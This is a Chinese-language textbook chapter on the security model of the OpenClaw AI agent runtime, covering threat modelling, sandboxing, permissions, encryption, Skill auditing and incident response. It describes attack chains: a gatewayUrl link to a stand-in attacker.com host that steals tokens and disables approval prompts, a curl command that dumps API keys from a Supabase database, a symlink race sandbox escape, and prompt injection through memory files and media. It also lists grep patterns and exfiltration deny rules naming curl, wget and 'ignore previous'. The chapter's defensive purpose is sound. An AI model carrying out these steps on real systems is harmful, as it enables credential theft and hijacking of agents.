# 安全模型：沙箱、权限、审计

> **本章导读**: OpenClaw 是一个能够直接执行系统命令、读写文件、调用 API 的 AI Agent 运行时。它的高权限特性是把双刃剑——在带来强大自动化能力的同时，也打开了前所未有的攻击面。基础模块中我们介绍了 OpenClaw 的安装配置和基本使用，本章将从安全工程角度，系统性地分析 OpenClaw 面临的安全威胁、沙箱隔离方案、权限模型、网络安全策略、数据保护措施，以及社区 Skill 的安全审计方法论。
>
> **前置知识**: 基础模块 10-01 架构概览、基础模块 10-04 Skills 安装与使用、本章 03 Hands 工具执行引擎、本章 07 Skill 开发进阶
>
> **难度等级**: ⭐⭐⭐⭐⭐

---

## 一、安全威胁建模：STRIDE 分析

STRIDE 是微软提出的经典威胁建模框架，按六类威胁对系统进行分类。对 OpenClaw 进行 STRIDE 分析，可以系统性地识别其攻击面并确定防护优先级。

### 1.1 STRIDE 威胁全景

| 威胁类型 | OpenClaw 场景 | 严重程度 |
|---------|---------------|---------|
| **S**poofing（身份欺骗） | 攻击者伪造 gatewayUrl 劫持 WebSocket 连接，窃取认证令牌 | 严重 |
| **T**ampering（篡改） | 恶意 Skill 修改记忆文件或配置文件，注入后门指令 | 高危 |
| **R**epudiation（抵赖） | Agent 执行高危操作后缺乏完整审计日志，无法追溯 | 中危 |
| **I**nformation Disclosure（信息泄露） | 记忆文件中明文存储的 API Key 被窃密木马打包外传 | 严重 |
| **D**enial of Service（拒绝服务） | 恶意 Skill 发起大量 API 调用耗尽 Token 配额 | 中危 |
| **E**levation of Privilege（权限提升） | 沙箱通过 TOCTOU 竞争条件逃逸，访问宿主机文件系统 | 严重 |

### 1.2 每类威胁的具体场景

**Spoofing——身份欺骗**

最典型的案例是 **CVE-2026-25253**（CVSS 8.8）。OpenClaw 的 Control UI 在处理 URL 查询参数 `gatewayUrl` 时，未做域名白名单校验，直接将认证令牌以明文形式通过 WebSocket 发送给攻击者指定的服务器。攻击者只需诱导用户访问一个恶意链接，即可窃取最高权限的 `authToken`，实现完整的远程代码执行。

攻击链如下：

1. 受害者点击 `http://localhost?gatewayUrl=ws://attacker.com:8080`
2. Control UI 将网关指向攻击者服务器
3. 握手阶段自动将 `authToken` 明文发送给攻击者
4. 攻击者使用窃取的 Token 调用 `exec.approvals.set` 关闭安全弹窗
5. 使用 `config.patch` 将工具执行目标从沙箱改为 `gateway`
6. 通过 `node.invoke` 执行任意系统命令

```typescript
// CVE-2026-25253 脆弱代码示意 —— 无校验的 gatewayUrl 处理
const gatewayUrlRaw = params.get("gatewayUrl");
if (gatewayUrlRaw != null) {
  const gatewayUrl = gatewayUrlRaw.trim();
  if (gatewayUrl && gatewayUrl !== host.settings.gatewayUrl) {
    applySettings(host, { ...host.settings, gatewayUrl }); // 直接接受！
  }
}
```

**Tampering——篡改**

ClawHavoc 供应链投毒事件中，攻击者上传了超过 1184 个恶意 Skill。这些 Skill 表面提供正常功能（如新闻摘要、天气查询），但在后台窃取浏览器 Cookie、会话令牌和 OpenClaw 配置文件。更危险的是，恶意 Skill 可以修改 `memory.md` 文件，植入后门指令，在后续的每次 Agent 交互中激活。

**Information Disclosure——信息泄露**

Moltbook 数据库泄露事件（2026 年 1 月 31 日）暴露了超过 150 万个 Agent API Token。根本原因是对 Supabase 的行级安全策略（RLS）未正确配置，所有携带 Anon Key 的请求都可完全读写数据库。存储在数据库中的 API Key 全部为明文，未做任何加密处理。

```bash
# 仅需浏览器 F12 获取 Anon Key，即可拖取全部数据
curl "https://[project].supabase.co/rest/v1/agents?select=name,api_key&limit=3" \
  -H "apikey: sb_pub_xxxxxx"
```

此外，攻击者利用 Supabase 的写权限，成功篡改了平台上的帖子内容，理论上可以利用此能力注入恶意 Prompt，对阅读帖子的其他 Agent 发起大规模间接提示注入攻击。

**Elevation of Privilege——权限提升**

**CVE-2026-41329**（CVSS 9.9）是 360 安全团队发现的沙箱绕过漏洞。OpenClaw 在处理 heartbeat 上下文继承机制时，对执行上下文及权限边界校验不充分，且 `senderIsOwner` 参数可被操控，导致攻击者能够伪造或继承高权限上下文，绕过既有 sandbox 限制。该漏洞影响 OpenClaw <= 2026.3.28 的所有版本。

### 1.3 威胁优先级排序

根据实际攻击案例和 CVSS 评分，威胁优先级排序如下：

| 优先级 | 威胁 | 理由 |
|-------|------|------|
| P0 | 沙箱逃逸与权限提升 | 直接导致宿主机沦陷，存在多个在野利用案例 |
| P0 | Skill 供应链投毒 | ClawHavoc 事件显示 12-20% 的 ClawHub Skill 含恶意代码 |
| P1 | WebSocket 凭证劫持 | CVE-2026-25253 已发现在野利用，影响超 15000 实例 |
| P1 | 记忆文件明文存储 | 窃密木马 Vidar 变种已针对性扫描 ~/.openclaw 目录 |
| P2 | 配置错误与公网暴露 | Censys 扫描显示超 42000 个 OpenClaw 实例暴露在公网 |
| P2 | 拒绝服务攻击 | 未做 API 限流时，Token 配额可被快速耗尽 |

---

## 二、Skill 沙箱隔离的三种方案

OpenClaw 的核心能力之一是执行第三方 Skill，而第三方代码天然不可信。沙箱（Sandbox）是在不可信代码与宿主系统之间建立安全隔离层的核心技术。

### 2.1 方案一：进程级沙箱（Node.js Worker Threads）

OpenClaw 的内置沙箱方案基于 Node.js 的 **Worker Threads**。通过在新线程中加载并执行 Skill 代码，利用 V8 引擎的进程内隔离机制限制其对宿主状态的直接访问。

```typescript
// OpenClaw Worker Threads 沙箱示意
import { Worker } from 'worker_threads';

function executeInSandbox(skillCode: string, timeout: number): Promise<SandboxResult> {
  return new Promise((resolve, reject) => {
    const worker = new Worker(`
      const { parentPort } = require('worker_threads');
      
      // 受限的全局环境
      const sandbox = Object.freeze({
        fetch: fetch,           // 受限的 fetch（白名单域名）
        readFile: null,         // 没有文件系统访问
        writeFile: null,
        process: { env: {} },   // 空环境变量
        console: { ... },       // 仅输出，无写入
      });
      
      try {
        const fn = new Function('sandbox', \`with(sandbox) { \${code} }\`);
        const result = fn(sandbox);
        parentPort.postMessage({ result });
      } catch (e) {
        parentPort.postMessage({ error: e.message });
      }
    `, { eval: true, argv: [], env: {} });
    
    const timer = setTimeout(() => {
      worker.terminate();
      reject(new Error('Sandbox timeout'));
    }, timeout);
    
    worker.on('message', (msg) => {
      clearTimeout(timer);
      resolve(msg);
    });
    
    worker.on('error', reject);
  });
}
```

**安全特性**:
- 进程内隔离，共享同一个 Node.js 进程
- 通过 `worker_threads` 的 `workerData` 传递受限数据
- 可通过 `vm` 模块创建沙箱上下文

**局限性**:

Snyk Labs 在 2026 年 2 月的研究中发现，仅依靠 Worker Threads 的沙箱存在两个关键漏洞：

1. **沙箱策略执行缺失**：`/tools/invoke` 端点在构建工具列表时未合并沙箱策略（sandbox policy），导致被限制在沙箱中的会话仍然能调用 `browser`、`gateway`、`nodes` 等敏感工具。

2. **TOCTOU 竞争条件逃逸**：`assertSandboxPath` 函数通过 `fs.lstat` 逐段检测符号链接，但"检测"和"使用"两个操作之间存在时间窗口。攻击者可利用 `renameat2()` 原子交换操作将普通文件快速替换为符号链接，实现沙箱逃逸，成功率约 25%。

```typescript
// TOCTOU 漏洞核心：检测与使用分离
async function assertNoSymlink(relative: string, root: string) {
  // ... 逐段检测符号链接
  for (const part of parts) {
    current = path.join(current, part);
    const stat = await fs.lstat(current);  // 检查时是普通文件
    // 攻击者在此时将文件替换为符号链接！
  }
  // 后续 fs.readFile 会跟随符号链接，访问沙箱外文件
}
```

### 2.2 方案二：容器级沙箱（Docker 容器隔离）

OpenClaw 支持将 Skill 执行环境切换到 Docker 容器中。这是目前官方推荐的生产级沙箱方案，也是 OpenClaw Sandbox 的核心实现。

```yaml
# OpenClaw 沙箱配置（Docker 模式）
sandbox:
  mode: docker                    # 沙箱模式
  image: openclaw/skill-sandbox   # 沙箱镜像
  memory: "512m"                  # 内存限制
  cpu: "0.5"                      # CPU 限制
  readOnly: true                  # 只读文件系统
  network: false                  # 禁用网络
  workspaces:
    enabled: true                 # 启用工作区
    allowPaths:
      - /tmp/openclaw-workspace   # 仅允许的路径
  timeout: 30s                    # 单次执行超时
```

**安全特性**:
- 内核级隔离（cgroups + namespaces）
- 可限制 CPU、内存、磁盘 I/O
- 文件系统可设为只读
- 网络可完全禁用或限制
- 支持工作区路径映射

**优势**:
- 隔离强度远高于进程级沙箱
- 社区生态成熟，工具链完善
- 支持资源配额精确控制

**风险**:

尽管如此，Docker 沙箱也非万无一失。深信服的安全团队指出，在 Docker 沙箱模式下构造容器内执行命令时，若将用户可控的 `PATH` 环境变量代入容器，攻击者可通过篡改 PATH 指向恶意二进制文件实现容器内逃逸。此外，CNCERT 联合发布的《OpenClaw 安全使用实践指南》明确指出，禁止采用 `--privileged` 特权模式运行容器。

### 2.3 方案三：VM 级沙箱（Firecracker 微虚拟机）

对于企业级部署，OpenClaw 社区和第三方厂商（如 E2B）提供了基于 **Firecracker** 的硬件级隔离方案。Firecracker 是 AWS 开源的微虚拟机管理器，每个 Agent 的执行环境运行在独立的 MicroVM 中。

```yaml
# Firecracker MicroVM 沙箱配置（社区方案）
sandbox:
  mode: firecracker               # MicroVM 模式
  vcpu: 1                         # 虚拟 CPU 核心数
  memory_mb: 256                  # 内存（MB）
  disk_size_mb: 500               # 磁盘大小
  jailer: true                    # 启用 Jailer 安全机制
  network: false                  # 默认无网络
  kernel_image: /opt/fc/hello-vmlinux.bin
  rootfs: /opt/fc/rootfs.ext4
```

**安全特性**:
- 硬件级虚拟化隔离（KVM）
- 每个 MicroVM 运行独立内核
- 攻击面极小（仅模拟 5 个设备）
- 启动速度约 125ms，接近容器级

**对比分析**:

| 维度 | Worker Threads（进程级） | Docker（容器级） | Firecracker（VM 级） |
|------|------------------------|-----------------|---------------------|
| **隔离强度** | 低（共享内核） | 中（共享内核，cgroups） | 高（独立内核，KVM） |
| **启动时间** | <1ms | ~100ms | ~125ms |
| **内存开销** | ~10MB | ~50MB | ~150MB |
| **安全边界** | V8 虚拟机 | 内核命名空间 | 硬件虚拟化 |
| **逃逸风险** | 高（已知 TOCTOU 漏洞） | 中（罕见内核逃逸） | 极低（理论上限） |
| **适用场景** | 开发调试、低风险 Skill | 生产环境、中等风险 Skill | 企业部署、高风险 Skill |
| **节点兼容性** | 所有平台 | 需要 Docker 环境 | Linux only（需 KVM） |
| **维护成本** | 低（内置） | 中（管理镜像更新） | 高（管理内核 + rootfs） |

> **沙箱逃逸事件分析**: 2026 年 2 月，Snyk Labs 在分析 OpenClaw v2026.1.29 时发现了两种沙箱逃逸路径：一是 `/tools/invoke` 端点的策略执行失败（未合并沙箱策略白名单），二是基于 TOCTOU 的符号链接竞争条件。前者允许沙箱中的会话调用原应禁止的管理工具，后者允许读写沙箱外的任意文件。Snyk 的修复方案是将文件操作移动到沙箱容器内部执行，而非在宿主机上操作。这一案例表明：沙箱不是单一配置项，而是一整套安全边界的工程实现，任何"策略声明"与"运行时执行"之间的不一致都会导致隔离失效。

### 2.4 混合沙箱策略

实际生产部署中，建议采用分级的混合沙箱策略：

```
Skill 来源         →    沙箱等级        →    执行环境
├─ 内置/官方 Skill →  无沙箱（信任）   →  Gateway 进程内
├─ 已验证社区 Skill →  进程级沙箱       →  Worker Threads
├─ 未验证 Skill     →  容器级沙箱       →  Docker 容器
└─ 高风险 Skill     →  VM 级沙箱       →  Firecracker MicroVM
```

---

## 三、权限模型设计

### 3.1 RBAC 在 OpenClaw 中的实现

OpenClaw 实现了基于角色的访问控制（RBAC），角色分为三层：

| 角色 | 权限范围 | 典型操作 |
|------|---------|---------|
| `viewer` | 只读观察 | 查看日志、查看配置、查看 Agent 状态 |
| `operator` | 日常操作 | 执行工具、调用 Skill、管理会话 |
| `admin` | 完全控制 | 修改配置、管理用户、关闭/重启 Gateway |

```yaml
# Gateway 用户角色配置
users:
  - id: "user-001"
    role: admin
    name: "管理员"
  - id: "user-002"
    role: operator
    name: "日常用户"
  - id: "user-003"
    role: viewer
    name: "只读用户"

# Skill 权限声明
skills:
  file-manager:
    role: admin              # 仅 admin 可以使用
  weather-check:
    role: operator           # operator 及以上可用
```

OpenClaw 的 session 权限基于 `senderIsOwner` 参数确定。**CVE-2026-41329** 的漏洞根源之一正是此参数可被操控：攻击者通过 heartbeat 上下文继承机制，在非预期的 session 中将自身标记为 owner，从而获得 admin 级别的操作权限。

### 3.2 工具级权限：读/写/执行三元组

OpenClaw 对每个工具定义了三种权限类型：

```typescript
// 工具权限定义
interface ToolPermission {
  name: string;
  permissions: {
    read: boolean;    // 允许读取数据
    write: boolean;   // 允许写入/修改数据
    execute: boolean; // 允许执行命令
  };
  allowed: boolean;   // 是否允许调用
}
```

不同等级的工具具有不同的默认权限：

| 工具类别 | 读 | 写 | 执行 | 示例 |
|---------|----|----|------|------|
| 信息查询 | Y | N | N | weather, news, time |
| 文件操作 | Y | Y | N | readFile, writeFile |
| 代码执行 | N | N | Y | system.run, python.exec |
| 网关管理 | Y | Y | Y | config.patch, gateway.restart |

工具权限通过多层策略栈叠加确定：

```
Profile（基线策略）→ Global（全局策略）→ Agent（用户策略）→ Group（群组策略）→ Sandbox（沙箱策略）
```

最终权限 = 各层策略的交集（最严格的策略生效）。

### 3.3 文件系统权限

OpenClaw 通过 `workspaceAccess` 和 `allowPaths` 控制 Skill 对文件系统的访问范围。

```yaml
# 文件系统权限配置
sandbox:
  workspaceAccess: "none"       # none | ro | rw
  allowedPaths:
    - /tmp/openclaw-workspace   # 允许的工作目录
    - /home/user/.openclaw/memory  # 允许的记忆目录
  blockedPaths:
    - /etc                      # 禁止的系统目录
    - /home/user/.ssh           # 禁止的 SSH 密钥目录
    - /home/user/.aws           # 禁止的 AWS 凭证目录
```

> **安全事件引用**: 2026 年 2 月，Hudson Rock 检测到 Vidar 窃密木马的新变种，专门针对 `~/.openclaw` 目录进行扫描和打包。Vidar 的 File Grabber 规则被更新为包含 `token`、`private key`、`~/.openclaw` 等关键字。被窃取的文件包括 `openclaw.json`（包含 Gateway Token）、`device.json`（包含设备私钥）、`memory.md`（包含对话历史和明文 API Key）。这一事件表明：文件系统权限控制不仅要限制运行时的 Skill，还要防御主机级恶意软件的直接窃取。

### 3.4 网络权限

OpenClaw 支持出站网络访问的精细控制：

```yaml
# 网络权限配置
network:
  defaultPolicy: deny               # 默认拒绝所有出站
  allowedDomains:
    - "api.openai.com"              # 仅允许的 LLM API
    - "api.anthropic.com"
    - "api.github.com"
    - "api.telegram.org"
  blockedIPs:
    - "0.0.0.0/0"                   # 禁止所有内网访问
    - "169.254.169.254"             # 禁止云元数据服务
  dnsFilter: true                   # DNS 级别过滤
  outboundProxy: "http://proxy:3128" # 强制通过代理
```

> **CVE 引用**: GHSA-6mgf-v5j7-45cr（CVSS 7.5）暴露了 OpenClaw 的 fetch-guard 组件在跨域重定向中，将自定义授权请求头直接转发到重定向目标地址。这意味着即使配置了严格的出站白名单，如果 LLM 或 Skill 发起一个到 `api.openai.com` 的请求，而该请求被 302 重定向到 `attacker.com`，授权头仍然会被转发给攻击者。

---

## 四、网络安全策略

### 4.1 入站访问控制

OpenClaw Gateway 默认监听 `127.0.0.1:18789`。将端口暴露到公网是最高危的配置错误之一。

```yaml
# 入站安全配置
gateway:
  host: "127.0.0.1"                # 仅监听本地
  port: 18789
  cors:
    origins:                        # CORS 白名单
      - "http://localhost:18789"
      - "https://dashboard.openclaw.ai"
    allowedMethods:                 # 允许的 HTTP 方法
      - "GET"
      - "POST"
    allowCredentials: false         # 禁止凭证共享
  rateLimiting:
    enabled: true
    maxRequests: 100                # 每分钟最大请求数
    windowMs: 60000
```

> **威胁数据**: Censys 和 Bitsight 在 2026 年 1-2 月的扫描显示，全球范围内暴露在公网的 OpenClaw 实例高达 **42000 余个**。这些未受保护的节点大量被自动化漏洞扫描器和定向攻击工具发现。

### 4.2 出站访问控制

出站流量应严格限制，防止恶意 Skill 外传数据。

```yaml
# 出站流量白名单
outbound:
  dns:                             # DNS 级别白名单
    - "api.openai.com"
    - "api.anthropic.com"
  ports:
    - 443                          # 仅允许 HTTPS
  blockedContent:                  # 响应内容过滤
    - pattern: "*script*"
    - pattern: "*base64*"
  exfiltrationPrevention:
    maxResponseSize: "10MB"        # 单次响应上限
    denyIfContains:                # 拦截含特定模式的外传
      - "BEGIN RSA PRIVATE KEY"
      - "ghp_"                     # GitHub Token 前缀
      - "sk-"                      # OpenAI/Supabase Key 前缀
```

### 4.3 TLS 加密配置

即使是本地部署，也推荐启用 TLS 加密防止中间人攻击。

```yaml
# TLS 配置
tls:
  enabled: true
  cert: /path/to/cert.pem
  key: /path/to/key.pem
  minVersion: "1.2"               # 最低 TLS 版本
  ciphers:
    - "TLS_AES_256_GCM_SHA384"     # 仅允许安全密码套件
    - "TLS_CHACHA20_POLY1305_SHA256"
```

### 4.4 内网部署安全建议

综合 CNCERT、360、奇安信和社区的最佳实践，内网部署应遵循以下基线：

1. **使用专用设备或虚拟机**：禁止在日常办公电脑上运行 OpenClaw。使用 Docker 容器或虚拟机做好环境隔离。
2. **最小权限原则**：不以 root/Administrator 权限运行。使用独立的操作系统用户。
3. **网络隔离**：Gateway 端口禁止暴露到公网。使用 WireGuard/SSH 隧道远程管理，严禁端口映射。
4. **全盘加密**：对 `~/.openclaw` 目录所在分区启用全盘加密。
5. **定期轮换凭证**：Gateway Token 和大模型 API Key 建立定期轮换机制。
6. **启用审计日志**：记录所有工具调用、文件访问和网络请求。

---

## 五、数据安全

### 5.1 记忆文件加密方案

OpenClaw 的记忆文件（`memory.md`）存储了 Agent 的完整对话历史、系统人设、日程安排和用户偏好，是安全保护的核心资产。

**推荐方案：操作系统级加密 + 文件加密**

```typescript
// 记忆文件加密示例（社区方案）
import { createCipheriv, randomBytes, scrypt } from 'crypto';

async function encryptMemory(
  content: string,
  passphrase: string
): Promise<string> {
  const salt = randomBytes(16);
  const iv = randomBytes(16);
  const key = await promisify(scrypt)(passphrase, salt, 32);
  const cipher = createCipheriv('aes-256-gcm', key, iv);
  
  const encrypted = Buffer.concat([
    cipher.update(content, 'utf8'),
    cipher.final(),
  ]);
  
  const authTag = cipher.getAuthTag();
  
  // 格式：salt:iv:authTag:ciphertext（Base64 编码）
  return Buffer.concat([salt, iv, authTag, encrypted]).toString('base64');
}
```

OpenClaw v2026.3.7 开始支持记忆文件的 AES-256-GCM 加密选项。启用后，Gateway 在写入记忆前自动加密，读取时自动解密。

```yaml
# 记忆加密配置
memory:
  encryption:
    enabled: true
    algorithm: "aes-256-gcm"
    keyProvider: "env"             # 从环境变量读取密钥
    envVar: "OPENCLAW_MEMORY_KEY"
  # 或者使用操作系统密钥链
  # keyProvider: "keychain"
  # keychainService: "openclaw-memory"
```

### 5.2 敏感信息脱敏

OpenClaw 在日志和调试输出中需要谨慎处理敏感信息。

```typescript
// 日志脱敏工具
function sanitizeLog(data: string): string {
  return data
    // API Key 脱敏：sk-xxx...xxx → sk-****...****
    .replace(/\b(sk-[A-Za-z0-9]{20,})\b/g, (match) => {
      return match.slice(0, 5) + '****' + match.slice(-4);
    })
    // GitHub Token 脱敏
    .replace(/\b(ghp_[A-Za-z0-9]{36,})\b/g, (match) => {
      return 'ghp_****' + match.slice(-4);
    })
    // 密码字段脱敏
    .replace(/("password"\s*:\s*)"[^"]+"/g, '$1"****"')
    // 授权头脱敏
    .replace(/Authorization:\s*Bearer\s+\S+/g, 'Authorization: Bearer ****');
}
```

**事件引用**: 在 CVE-2026-25253 的分析中，研究者发现 OpenClaw 的 WebSocket 握手协议会将 `authToken` 以明文形式作为 Payload 的一部分发送。类似的，GHSA-rchv-x836-w7xp（CVSS 7.1）暴露了管理仪表盘将网关认证材料通过浏览器 URL 查询参数和 localStorage 传输和保存，未做加密和脱敏。

### 5.3 配置文件保护

```yaml
# 配置文件安全建议
config:
  # 开放权限上限
  maxPermissions: "operator"        # 配置文件自身不超过此权限

files:
  ~/.openclaw/openclaw.json:        # 主配置文件 —— 最高敏感
    permission: 0600                 # 仅所有者读写
    encrypt: true
  
  ~/.openclaw/device.json:          # 设备密钥 —— 最高敏感
    permission: 0600
    encrypt: true
  
  ~/.openclaw/memory/*.md:          # 记忆文件 —— 高敏感
    permission: 0600
    encrypt: true
  
  ~/.openclaw/skills/*.md:          # Skill 文件 —— 中敏感
    permission: 0644
    sign: true                       # 需要数字签名验证
```

360 安全团队在发现 OpenClaw 高危漏洞时特别指出，OpenClaw 默认将大量敏感配置文件以明文形式存储在宿主机的 `~/.openclaw/` 目录中。窃密木马只需在 File Grabber 配置中添加此目录的扫描规则，即可一次性窃取所有核心资产。因此，对配置文件的权限收紧和加密保护不是可选项，而是安全基线。

---

## 六、社区 Skill 的安全审计方法论

### 6.1 审计流程

ClawHavoc 事件后，社区和基金会建立了一套五步审计流程：

```
Step 1: 下载隔离
  ├─ 在沙箱环境下载 Skill 包
  ├─ 使用 VirusTotal API 扫描文件哈希
  └─ 记录所有下载源和元数据

Step 2: SKILL.md 审查
  ├─ 检查 YAML frontmatter 中的权限声明
  ├─ 分析所需工具是否与功能描述匹配
  ├─ 标记"请求权限 > 实际需要"的过度索取
  └─ 检查 install 声明中的外部下载 URL

Step 3: 源码审查
  ├─ 扫描 Shell 命令（grep -iE 'curl|wget|eval|exec'）
  ├─ 扫描 Base64/编码混淆（grep -iE 'base64|fromBase64|decodeURI'）
  ├─ 扫描文件外传模式（grep -iE 'http.*post|fetch.*put'）
  └─ 扫描提示注入载荷（grep -iE 'system instruction|ignore previous'）

Step 4: 工具依赖检查
  ├─ 验证 SKILL.md 中声明的工具在白名单内
  ├─ 检查 requires.bins 中的二进制文件是否包含恶意命令
  └─ 验证 install 声明的安装器来源是否可信

Step 5: 沙箱测试
  ├─ 在 Docker 沙箱中执行 Skill
  ├─ 监控文件系统访问（除工作区外）
  ├─ 监控网络连接（白名单外域名）
  └─ 验证功能是否与描述一致
```

### 6.2 红色警报清单

以下模式一旦发现，应直接判定为恶意 Skill：

| 警报模式 | 危险等级 | 检测方法 |
|---------|---------|---------|
| **命令混淆** | 致命 | 检测 Base64 编码、hex 编码、reverse 字符串的 shell 命令 |
| **ClickFix 诱导** | 致命 | 检测 SKILL.md 中引导用户复制粘贴执行命令的指令 |
| **数据外传** | 致命 | 检测 fetch/POST 请求到非标准端口或非 LLM API 域名 |
| **权限过度请求** | 高危 | 检测不需要文件访问的 Skill 请求 rw 权限 |
| **隐藏网络连接** | 高危 | 检测后台定时执行的网络请求 |
| **eval/动态执行** | 高危 | 检测代码中的 `eval()`、`new Function()`、`exec()` |
| **符号链接利用** | 高危 | 检测创建或操作符号链接的代码 |
| **环境变量读取** | 中危 | 检测读取 `process.env` 并外传的代码 |

### 6.3 ClawHub 恶意 Skill 安全报告

| 指标 | 数据 | 来源 |
|------|------|------|
| 恶意 Skill 总数 | 341+（含 1184 个变种） | The Hacker News, 2026.02 |
| ClawHub 中毒比例 | 约 12-20% | OpenClaw Consult |
| 攻击类型 | AMOS 木马、Token 窃取、后门 | Trend Micro, OpenSourceMalware |
| 主要恶意载荷 | Atomic macOS Stealer | 多源确认 |
| 受影响的 Agent 数量 | 数千至数万 | 多方估计 |
| 攻击窗口 | 2026.01.24 - 2026.02.13 | NSFOCUS |

主要恶意 Skill 变种：

- **google-k53**：伪装成 Google 服务的 Skill，诱导用户执行 Curl 命令下载 Atomic macOS Stealer 木马，收割 macOS 钥匙串、浏览器密码和加密货币钱包。
- **rankaj**：在查询天气的并行线程中，读取并外传 `~/.clawdbot/.env` 配置，窃取 Claude/OpenAI API Key。
- **tech-news-digest**：提供正常新闻摘要功能，同时在后台窃取浏览器 Cookie 和 OpenClaw 配置文件。

### 6.4 360 智能体发现的高危漏洞信息

360 数字安全集团通过其自主研发的多智能体协同漏洞挖掘系统，在 OpenClaw 平台中发现了多个高危漏洞：

| 发现时间 | 漏洞类型 | 影响范围 | 严重程度 |
|---------|---------|---------|---------|
| 2026.03 | Gateway WebSocket 无认证升级漏洞 | 获创始人 Peter 确认，报送 CNVD | 0Day 高危 |
| 2026.03.31 | MEDIA 协议 Prompt 注入绕过工具权限泄露本地文件 | CNNVD 确认，影响全球 50+ 国家，17 万+ 公开实例 | 高危 |
| 2026.04 | 三大新漏洞（直指 Agent 核心运行机制） | 影响用户设备、数据与账号核心安全 | 高危 |

360 的发现表明：**OpenClaw 的攻击面正在从传统的 Web 漏洞向 Agent 特有的跨模态攻击面延伸**。MEDIA 协议的 Prompt 注入漏洞（2026.03.31）即是典型案例——攻击者通过向媒体处理管道注入恶意 Prompt，让 LLM 误读指令，从而绕过工具权限控制，泄露本地文件。

---

## 七、安全事故应急预案示例

### 7.1 Skill 感染恶意代码的响应流程

**场景**: 发现已安装的某个 Skill 存在恶意行为（如可疑的网络外传）。

**响应步骤**:

```
1. 立即隔离（1 分钟内）
   ├─ 停止 Gateway 进程：systemctl stop openclaw-gateway
   ├─ 断开网络连接：ifconfig en0 down 或物理拔线
   └─ 不关机（保留内存中的取证信息）

2. 评估影响范围（5 分钟内）
   ├─ 检查 ~/.openclaw/access.log 查看工具调用记录
   ├─ 检查 ~/.openclaw/skills/ 下已安装的所有 Skill
   ├─ 检查系统网络连接状态：netstat -an | grep ESTABLISHED
   └─ 检查 ~/.ssh/authorized_keys 有无新增公钥

3. 凭证轮换（15 分钟内）
   ├─ 重置所有 LLM API Key（OpenAI/Anthropic/Google）
   ├─ 重置 Gateway Token：openclaw gateway token --rotate
   ├─ 重置 GitHub Token、AWS Key 等关联凭证
   └─ 通知关联服务撤销旧凭证

4. 清理与恢复（30 分钟内）
   ├─ 删除 ~/.openclaw 后重新初始化（建议从备份恢复）
   ├─ 使用 SecureClaw 工具扫描系统：secureclaw scan --full
   ├─ 升级到 OpenClaw 最新版本
   └─ 仅从可信来源重新安装 Skill
```

### 7.2 数据泄露的应急处理

**场景**: 发现 Agent 记忆文件或配置文件已被外传（如在暗网发现或收到威胁邮件）。

**响应步骤**:

```
1. 确认泄露内容
   ├─ 检查哪些文件被访问：grep "readFile" ~/.openclaw/audit.log
   ├─ 确认泄露的时间窗口
   └─ 评估泄露数据的敏感级别

2. 法律响应
   ├─ 评估是否需要向监管机构报告（依据当地数据保护法规）
   ├─ 企业环境需通知安全团队和数据保护官
   └─ 保留系统日志作为取证证据

3. 通知相关方
   ├─ 如果 API Key 泄露：通知 LLM 服务商撤销受影响 Key
   ├─ 如果个人隐私泄露：评估是否需要通知受影响用户
   └─ 跟踪凭证滥用情况（如 API 调用量异常增长）

4. 长期加固
   ├─ 启用记忆文件加密
   ├─ 部署网络出站白名单
   ├─ 启用文件系统权限限制
   └─ 建立定期安全审计流程
```

### 7.3 恢复步骤

```
1. 准备恢复环境
   ├─ 在新的隔离环境中部署最新版 OpenClaw
   ├─ 从受信任的备份中恢复配置（不含 Skill）
   └─ 确认新环境网络隔离正常

2. 最小化恢复
   ├─ 先仅安装官方内置 Skill
   ├─ 确认 Agent 正常运行
   └─ 逐步添加社区 Skill，每添加一个运行一次 SecureClaw 扫描

3. 生产上线
   ├─ 启用所有安全配置（沙箱、权限控制、审计日志）
   ├─ 修改默认端口号（可选）
   ├─ 监控运行日志一周
   └─ 确认无异常后投入正常使用
```

---

## 总结

OpenClaw 的安全模型面临的根本挑战是：**它的价值——能够自由执行命令、读写文件、调用 API——恰好也是它的攻击面**。2026 年上半年密集披露的 82+ 个 CVE 漏洞和频繁的安全事件，充分反映了 Agent 安全这一新兴领域的复杂性。

从本章的分析可以总结出三条核心原则：

1. **纵深防御（Defense in Depth）**：没有任何单一防护措施是足够的。沙箱会逃逸、权限会被绕过、配置会出错。只有在进程级、容器级/VM 级、网络级、文件系统级同时设置防护层，才能有效降低风险。

2. **最小权限（Least Privilege）**：Agent 能做的事越少，越安全。一个"新闻摘要" Skill 不应该能访问 `~/.ssh` 目录。默认拒绝（default-deny）比白名单更安全。

3. **可审计（Auditability）**：每次工具调用、文件读取、网络请求都应该被记录。审计日志是事后溯源的唯一依据，也是改进安全策略的数据基础。

> **安全不是配置项，而是架构原则。** OpenClaw 从 v2026.3.7 开始引入了多项安全改进，ClawHub 也通过与 VirusTotal 合作、引入 SecureClaw 工具等手段加强生态安全。但对部署者而言，安全的责任最终落到自己手中——保持更新、最小化暴露、持续审计，这三件事缺一不可。

---

**参考资源**:
- OpenClaw 官方安全公告: https://github.com/openclaw/openclaw/security
- CVE-2026-25253 技术分析: https://thehackernews.com/2026/02/openclaw-bug-enables-one-click-remote.html
- CVE-2026-41329 NVD 详情: https://nvd.nist.gov/vuln/detail/CVE-2026-41329
- Snyk Labs 沙箱逃逸研究: https://labs.snyk.io/resources/bypass-openclaw-security-sandbox/
- NSFOCUS 生态安全事件解读: https://blog.nsfocus.net/openclaw-recent-security-events/
- 奇安信 OpenClaw 安全风险排查指南: https://www.secrss.com/articles/88371
- CNCERT 联合发布 OpenClaw 安全使用实践指南
- SecureClaw 审计工具: https://github.com/adversa-ai/secureclaw
- OpenClaw VirusTotal 合作公告: https://openclaw.ai/blog/virustotal-partnership
- 绿盟星云实验室云上 AI 安全事件深度复盘
